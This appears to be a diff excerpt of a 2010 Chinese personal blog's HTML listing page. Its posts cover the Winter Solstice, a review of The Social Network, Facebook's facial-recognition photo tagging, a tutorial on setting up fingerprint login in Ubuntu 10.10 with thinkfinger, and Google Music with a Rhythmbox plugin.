+今日冬至,因为陈道明饰演的陈一平这个角色而记住了这个时令,陈一平在这一天因为痛苦和贪欲&#8221;蜕变&#8221;了,自己什么时候会变?在北方冬至这天人们会吃饺子,不过因为今天外出忘记吃饺子了.手机发文,希望不会掉字&#8230;&#8230;&#8230;希望不会掉字<br>Blogged with cell phone on Palm OS by ocean.</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2010-12-22T00:00:00+08:00" pubdate data-updated="true">Dec 22<span>nd</span>, 2010</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/personal/'>Personal</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/blog/2010/12/22/the-winter-solstice/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2010/12/19/social-network-the-soical-network-critics/">
+		
+			社交网络|the Soical Network 影评</a>
+	</h2>
+	<div class="entry-content">
+		<p>深夜,躺在床上,听着五月天阿信和孙燕姿合唱的&lt;&lt;王子面>>,浏览着下午找资料时搜索到的国外网友(其实是黑客,后来才注意到的-_-||)的博客,发现了一段代码,写的很cool,阅读一段很cool的代码,内心的愉悦不亚于自己写出一段代码.网络让地球变成地球村,国界消失,于是可以躺在床上通过Wi-Fi浏览国外网友的博客,这也是这篇影评的原因,上个月看完&lt;&lt;社交网络>>,比较懒就迟迟没有写影评,趁现在心情愉悦补上.</p>
+
+<p>网络评论说WEB2.0是一场草根革命,看过&lt;&lt;社交网络>>后更是深有感触,Facebook是哈佛大学的学生马克·扎克伯格在2004创建的,起初注册仅限于学院内部,随后的两个月内，注册扩展至波士顿地区的其他高校,后来发展到在全球范围内有一个大学后缀的电子邮箱的人都可以注册,最终开放成所有人都可以注册.目前Facebook的用户据估计有5亿,市值250亿美元,全球访问量最高的网站.和Facebook一起新兴的还有Twitter和Youtube网站,Twitter从06年建立到现在的Twitter坐拥十亿用户，15 亿美元的收入以及11亿美元的净收入只用了四年；Youtube的建立比Twitter早一年,在2006年被谷歌以16.5亿美元收购,目前网上有报道指处YouTube一天有超过20亿部影片的观赏，并被形容为&#8221;超过美国三大电视频道于黄金时段，观看总人数的一倍左右&#8221;. 正是因为Twitter和Facebook等新兴的WEB2.0的存在,资讯以几何递增的速度传播,草根才可以和明星对话,即使草根也可以通过网络走红;可以享受种种网络带来的便利,阅读资讯,下载音乐,在线观看电影,同远方的亲朋好友通讯,搜索资料,接受远程教育并参与互动在虚拟的电子课堂提问或回答,甚至听哈佛耶鲁等世界知名高校的大学课程,于是身在中国的我于几个月前有幸听了YYETS论坛字幕组翻译的哈佛大学的公开课:&#8221;公正:该如何是好&#8221;.很讽刺的是上述三个网站在中国由于某种原因不能访问.我们访问的网络只不过是一个大的局域网,真正让我们成为局域网的不是那个墙,而是我们自己的肤浅.恶,影评让我写成发牢骚了,就此打住.</p>
+
+<p>喜欢孙燕姿的可以在twitter上follow她,孙燕姿的twitter帐号:@<a href="http://twitter.com/STEFSUNYANZI" target="_blank">Stef Sun (Stefsunyanzi)</a>她前一段时间换了新头像:),看她之前以及几个小时前发的推&#8221;Really have to finish packing and stop a-twitterin.&#8221; ,新的专辑已经录完音完成打包,应该很快就上市了.</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2010-12-19T00:00:00+08:00" pubdate data-updated="true">Dec 19<span>th</span>, 2010</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/personal/'>Personal</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/blog/2010/12/19/social-network-the-soical-network-critics/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2010/12/16/facebook-photo-tags-into-facial-recognition-technology/">
+		
+			Facebook照片标签引入面部识别技术</a>
+	</h2>
+	<div class="entry-content">
+		<p>新闻来源:csdn
+Facebook周三宣布，将在照片标签功能中引入面部识别技术。此后，当用户上传照片，并为好友添加标签时，便可以借助面部识别功能获得一个推荐列表。 凭借用户为照片添加的大量标签以及用户资料中包含的图片，Facebook已经建立了庞大的数据库，可以判断某张照片中究竟包含哪些人。Facebook 表示，该网站目前日均图片上传量达到1亿张。</p>
+
+<p><a href="http://nwy.me/img/2010/12/facebook2.jpg"><img class="aligncenter size-full wp-image-62444" title="facebook2" src="http://nwy.me/img/2010/12/facebook2.jpg" alt="" width="550" height="500"></a></p>
+
+
+		
+		<a href="/blog/2010/12/16/facebook-photo-tags-into-facial-recognition-technology/" class="more-link">Read on &rarr;</a>
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2010-12-16T00:00:00+08:00" pubdate data-updated="true">Dec 16<span>th</span>, 2010</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/personal/'>Personal</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/blog/2010/12/16/facebook-photo-tags-into-facial-recognition-technology/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2010/12/13/ubuntu10-10-to-achieve-finger/">
+		
+			Ubuntu10.10下实现指纹登录</a>
+	</h2>
+	<div class="entry-content">
+		<p>1、安装thinkfinger软件</p>
+
+<div style="font-family: &amp;amp; color: #dcdccc; background-color: #3f3f3f;"><span style="color: #dcdccc;">ocean@ocean-laptop:~$ sudo apt-get install thinkfinger-tools libpam-thinkfinger</span></div>
+
+
+<p>2、采集指纹并校验：</p>
+
+<div style="font-family: &amp;amp; color: #dcdccc; background-color: #3f3f3f;"><span style="color: #dcdccc;">ocean@ocean-laptop:~$ sudo tf-tool &#8211;acquire //采集指纹,连续扫描三次指纹</span></div>
+
+
+<div style="font-family: &amp;amp; color: #dcdccc; background-color: #3f3f3f;"><span style="color: #dcdccc;">ocean@ocean-laptop:~$ sudo tf-tool &#8211;verify //校验指纹</span></div>
+
+
+<h1>第二步需要超级用户权限,否则不能驱动指纹传感器,,如果提示Initializing&#8230;USB device not found,建议重启一下系统,然后再进行这一步操作,由于博客主题代码问题&#8221;- -acquire&#8221;会显示为&#8221;&#8211;acquire&#8221;,操作的时候请注意</h1>
+
+<p>3、启用指纹功能</p>
+
+<div style="font-family: &amp;amp; color: #dcdccc; background-color: #3f3f3f;"><span style="color: #dcdccc;">ocean@ocean-laptop:~$ sudo /usr/lib/pam-thinkfinger/pam-thinkfinger-enable</span></div>
+
+
+<p>4、在debian最新的thinkfinger包中已经放弃原用的 &#8211;add-user参数,而是在第二次运行程序时仍然使用&#8211;acquire参数,自动生成后缀为bir的指纹文件存放在家目录下.
+如果希望在su,sudo时也使用指纹识别(gksu,gksudo包括emacs的tramp也已经可以使用了)就以root用户身份登录后生成指纹文 件.然后重启,登录时先输入用户名,然后原来password处应该已经变成password or swipe finger了.之后就可以用刷指纹代替输入密码了.</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2010-12-13T00:00:00+08:00" pubdate data-updated="true">Dec 13<span>th</span>, 2010</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/linux/'>Linux</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/blog/2010/12/13/ubuntu10-10-to-achieve-finger/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2010/12/08/in-addition-to-baidu-mp3-you-have-a-better-choice-google-music/">
+		
+			除了百度MP3,你还有更好的选择-谷歌音乐</a>
+	</h2>
+	<div class="entry-content">
+		<p><a href="http://www.google.cn/music" target="_blank">Google音乐</a>是谷歌被迫适应中国国情而推出的一种新的音乐服务运作模式的实验，用户无需为正版音乐付费。谷歌通过在线音乐广告分成的模式让找到了一个提升用户体验、尊重歌手创作、尊重版权之间的平衡。</p>
+
+<p><a href="http://www.google.cn/music" target="_blank">Google音乐</a>与巨鲸音乐网（www.Top100.cn）合作，所有音乐文件均经过唱片公司正版授权，并提供免费高品质MP3文件下载，每个MP3文件的音质均在192Kbps以上。谷歌官方指其音乐库数量已达数十万首，并且在不断增加中.</p>
+
+<p><a href="/wp-content/uploads/2010/12/Screenshot.png"><img class="aligncenter size-thumbnail wp-image-62233" title="Screenshot" src="http://nwy.me/img/2010/12/Screenshot-150x150.png" alt="" width="150" height="150"></a>题外话:如果你在使用Linux下的Rhythmbox,这里提供一个网友写的谷歌音乐插件,该插件可以在Rhythmbox里播放谷歌音乐,甚至支持拖拽歌曲到本地目录的下载方式.</p>
+
+<p>下载googlemusic 解压在 /usr/lib/rhythmbox/plugins/googlemusic 目录下,或 ~/.local/share/rhythmbox/plugins/googlemusic 目录下.</p>
+
+<p>下载连接: <a href="http://nwy.me/img/2010/12/googlemusic_Rhythmbox%200.13.1.tar.gz">googlemusic_Rhythmbox%200.13.1.tar</a></p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2010-12-08T00:00:00+08:00" pubdate data-updated="true">Dec 8<span>th</span>, 2010</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/personal/'>Personal</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/blog/2010/12/08/in-addition-to-baidu-mp3-you-have-a-better-choice-google-music/#disqus_thread">Comments</a></div>
 	
 </div>
 </article>
